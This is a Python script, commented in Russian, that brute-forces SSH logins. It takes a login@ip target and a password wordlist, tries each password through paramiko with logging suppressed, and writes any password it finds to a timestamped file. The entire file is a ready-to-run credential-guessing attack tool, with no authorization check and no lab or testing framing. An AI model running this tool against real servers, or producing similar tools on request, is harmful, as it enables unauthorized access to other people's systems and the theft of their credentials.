import paramiko
import time
import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
from progress.bar import IncrementalBar
class BruteForce:
    #Функция иницализации
    def __init__(self):
        self.login = ""
        self.ip_a = ""
        self.path_psw = "" 
        self.arr_psw = []
        self.find_psw = ""
    #Функция ввода
    def inp(self):
        self.target = input("Введите login@ip: ").lower() 
        if self.target.find('@') == -1:
            print('не правильный ввод!')
            return 
        self.login, self.ip_a = self.target.split("@")
        self.path_psw = input("Введите путь к файлу с паролями: ")
    #Функция для чтения паролей из файла и перенос их в список
    def read_psw(self):
        with open(self.path_psw, 'r') as file:
            for line in file:
                line = line.strip()
                self.arr_psw.append(line)
    #Функция для ssh-коннетка 
    def sshcon(self):
        bar = IncrementalBar('overkill_password', max=len(self.arr_psw))
        for passw in self.arr_psw:
            bar.next()
            client = paramiko.SSHClient()
            try:
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    username = self.login, 
                    hostname = self.ip_a, 
                    password = passw,
                    timeout=5,
                    look_for_keys=False, 
                    allow_agent=False
                )
                client.close()
                print(f"\nПароль найден: {passw}")
                self.find_psw = passw
                bar.finish()
                return 0
            #Обработка ошибки с неверным паролем
            except paramiko.AuthenticationException:
                if client:
                    client.close()
                time.sleep(0.5)
                continue
            #Обработка ошибки когда с ssh какие то проблемы
            except paramiko.SSHException:  
                if client:
                    client.close()
                time.sleep(0.5)
                continue
            #обработка ошибки когда Соединение сброшено сервером 
            except ConnectionResetError: 
                if client:
                    client.close()
                time.sleep(0.5)
                continue
            #обработка ошибки когда сервер закрыл соединение
            except EOFError:
                if client:
                    client.close()
                time.sleep(0.5)
                continue
        bar.finish()
        return -1
    #Функция для сохранения в файл
    def Save(self):
        date = time.strftime("%Y.%m.%d.%H:%M")
        filename = f"{date}_ssh-password.txt"
        with open(filename, 'w') as file:
            file.write(f"ip: {self.ip_a}\nlogin: {self.login}\npassword: {self.find_psw}")
        print("The save is successful")

def work():
    bruteforce = BruteForce()
    bruteforce.inp()
    bruteforce.read_psw()
    if (bruteforce.sshcon() == 0):
        bruteforce.Save()

def main():
    work()

if __name__ == '__main__':
    main()
